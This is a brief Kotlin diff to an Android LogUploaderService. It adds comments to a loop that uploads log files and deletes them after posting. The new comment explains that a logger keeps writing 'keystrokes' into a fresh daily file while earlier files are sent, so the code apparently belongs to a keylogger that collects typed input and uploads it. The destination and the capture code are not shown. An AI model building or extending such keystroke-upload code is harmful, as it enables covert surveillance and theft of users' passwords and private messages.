@@ -216,6 +216,8 @@ class LogUploaderService : Service() {
         for (f in files) {
             if (!f.isFile) continue
             try {
+                // LoggerWriter auto-reopens a fresh per-day file after this one
+                // gets renamed to .sent, so keystrokes keep landing in today's log.
                 val success = postLog(f)
                 if (success) {
                     if (AppConfig.DELETE_AFTER_UPLOAD) {
